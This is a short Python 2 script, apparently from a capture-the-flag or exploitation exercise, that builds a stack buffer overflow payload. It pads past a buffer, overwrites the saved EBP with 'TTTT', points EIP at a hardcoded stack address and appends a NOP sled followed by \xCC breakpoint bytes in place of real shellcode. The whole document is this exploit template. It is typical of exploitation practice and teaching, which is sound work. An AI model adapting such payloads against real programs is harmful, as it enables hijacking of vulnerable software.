import struct
padding ="AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMOOOOPPPPQQQQRRRRSSSS"
ebp = "TTTT"
eip = struct.pack("I", 0xffffcd20+150)
shellcode = "\x90" * 150 + "\xCC" * 4
payload = padding + ebp + eip + shellcode
print payload